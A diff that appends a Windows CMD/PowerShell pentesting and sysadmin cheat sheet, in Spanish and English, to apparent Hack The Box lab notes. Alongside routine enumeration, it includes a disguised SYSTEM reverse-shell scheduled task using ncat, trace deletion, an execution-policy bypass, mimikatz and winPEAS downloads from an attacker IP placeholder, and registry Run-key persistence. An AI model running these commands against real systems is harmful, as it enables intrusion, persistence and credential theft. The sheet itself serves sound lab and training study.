@@ -2105,3 +2105,95 @@ Get-Process | Sort-Object ProcessName -Descending | Where-Object { $_.ProcessNam
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 | Format-List
 ```
 * **Flag:** `justalocaladmin`
+
+# 🛠️ Windows CLI & PowerShell: Pentester & SysAdmin Cheat Sheet
+
+> **Operational Scope:** Reference guide for local host enumeration, file system manipulation, service management, and active directory reconnaissance. Optimized for Help Desk N2, SysAdmin troubleshooting, and initial post-exploitation phases.
+
+## 1. 🗂️ File System & Basic Navigation (CMD / PS)
+
+| Operación | CMD (`cmd.exe`) | PowerShell (`powershell.exe`) | Valor Táctico / Notas |
+| :--- | :--- | :--- | :--- |
+| **Listar Directorios** | `dir /A:H` (Ocultos) | `Get-ChildItem -Hidden -Force` | Identificar archivos de configuración ocultos o *loot*. |
+| **Árbol Recursivo** | `tree /F` | `ls -Recurse` | Mapeo rápido de la estructura del *filesystem*. |
+| **Búsqueda de Cadenas** | `findstr /I "password" *.txt` | `Select-String -Pattern "password" -Path *.txt` | Búsqueda profunda de credenciales en texto claro. |
+| **Búsqueda de Archivos** | `where /R C:\ *.config` | `Get-ChildItem -Recurse -Filter *.config` | Localizar configuraciones sensibles fuera del PATH. |
+| **Leer Archivos** | `type file.txt` \| `more` | `Get-Content file.txt` | Extraer contenido sin bloquear el archivo (*locking*). |
+| **Copias Robustas** | `robocopy /E /MIR /A-:SH src dst` | `Copy-Item -Recurse` | `robocopy` es ideal para exfiltrar evadiendo atributos. |
+
+## 2. 🕵️ Host & Network Reconnaissance
+
+### 🖥️ System & User Enumeration
+* **Contexto de Sesión:** `whoami /priv` (Muestra privilegios de seguridad actuales, crítico para escalada).
+* **Usuarios Locales:** `net user` (CMD) o `Get-LocalUser | Select Name, Enabled` (PS).
+* **Grupos Locales:** `net localgroup Administrators` o `Get-LocalGroupMember -Name "Administrators"`.
+* **Información del Sistema:** `systeminfo` (Ruidoso, pero extrae parches y versión del OS).
+* **Variables de Entorno:** `set` (CMD) o `Get-ChildItem Env:` (PS). 
+    * *High-Value Targets:* `%PATH%`, `%USERPROFILE%`, `%LOGONSERVER%`.
+
+### 🌐 Network Diagnostics & Enumeration
+* **Interfaces IP:** `ipconfig /all` (CMD) o `Get-NetIPAddress` (PS). Busca *dual-homed hosts* para *pivoting*.
+* **Tabla ARP:** `arp -a` (CMD) o `Get-NetNeighbor` (PS). Fundamental para descubrir el DC u otros *endpoints*.
+* **Conexiones Activas:** `netstat -an` (Identifica puertos a la escucha: 22, 445, 3389, 5985).
+* **Test de Conectividad:** `Test-NetConnection -ComputerName 10.10.10.10 -Port 445` (Diagnóstico de puertos TCP en PS).
+
+## 3. ⚙️ Service & Scheduled Task Management
+
+### Windows Services (Identificación y Control)
+| Acción | CMD (`sc.exe` / `net`) | PowerShell |
+| :--- | :--- | :--- |
+| **Listar Todos** | `sc query type= service` | `Get-Service` |
+| **Filtrar (Ej. Defender)**| `sc query windefend` | `Get-Service | Where-Object DisplayName -like '*Defend*'` |
+| **Detener Servicio** | `sc stop Spooler` | `Stop-Service -Name Spooler` |
+| **Modificar Inicio** | `sc config bits start= disabled` | `Set-Service -Name bits -StartupType Disabled` |
+| **Identificar PID** | `tasklist /svc` | `Get-Process | Select Name, Id` |
+
+### Scheduled Tasks (`schtasks`) - *Vector de Persistencia*
+* **Enumerar Tareas:** `schtasks /query /v /fo list`
+* **Crear Persistencia (Reverse Shell en arranque):**
+    `schtasks /create /sc ONSTART /tn "Update Check" /tr "C:\Temp\ncat.exe 10.10.x.x 4444 -e cmd.exe" /ru SYSTEM`
+* **Eliminar Rastro:** `schtasks /delete /tn "Update Check" /f`
+
+## 4. 🧠 PowerShell Automation & Pipeline Logic
+
+El poder de PowerShell reside en el paso de **objetos**, no de texto plano.
+
+* **Descubrimiento de Comandos:** `Get-Command -Module ActiveDirectory`
+* **Inspección de Objetos:** `Get-Process | Get-Member` (Muestra propiedades y métodos disponibles).
+* **Filtrado de Pipeline:** `Get-Service | Where-Object {$_.Status -eq "Running"}`
+* **Agrupación y Conteo:** `Get-LocalUser | Group-Object -Property Enabled`
+* **Bypass de Política de Ejecución (Solo en el proceso actual):**
+    `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
+
+## 5. 🏰 Active Directory (RSAT) & Remote Management
+
+### Active Directory Enumeration
+* **Usuarios del Dominio:** `Get-ADUser -Filter * -Properties * | Select Name, IPv4Address, LogonCount`
+* **Filtrado Específico:** `Get-ADUser -Filter {Surname -eq "Admin"}`
+* **Computadoras del Dominio:** `Get-ADComputer -Filter *`
+
+### Remote Execution (WinRM & SSH)
+* **SSH a máquina objetivo:** `ssh htb-student@10.129.x.x`
+* **Iniciar sesión interactiva PS (WinRM):** `Enter-PSSession -ComputerName 172.16.5.155 -Credential htb-student`
+* **Ejecución masiva de scripts:** `Invoke-Command -ComputerName DC-01, FILE-SRV -ScriptBlock { Get-Service WinDefend }`
+
+## 6. 📥 Web Interaction & File Transfers
+
+Para descargar *payloads* o herramientas sin tocar navegadores (Evadir *logging* GUI).
+
+* **Descarga directa (PowerShell 3.0+):**
+    `Invoke-WebRequest -Uri "http://<ATTACK_IP>/winPEAS.exe" -OutFile "C:\Temp\winPEAS.exe"`
+* **Descarga vía .NET (Fallback):**
+    `(New-Object Net.WebClient).DownloadFile("http://<ATTACK_IP>/mimikatz.exe", "C:\Temp\mimi.exe")`
+
+## 7. 📖 Windows Event Logs & Registry
+
+### Event Logs (Threat Hunting / Triage)
+* **CMD (wevtutil):** `wevtutil qe Security /c:5 /rd:true /f:text` (Lee los 5 últimos eventos de seguridad).
+* **PowerShell (Get-WinEvent):**
+    `Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625'} -MaxEvents 10` (Filtra fallos de inicio de sesión - Brute Force).
+
+### Windows Registry (Auditoría y Persistencia)
+* **Leer Clave (CMD):** `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+* **Crear Persistencia (RunOnce):**
+    `New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name "Updater" -Value "C:\Temp\payload.exe" -PropertyType String`
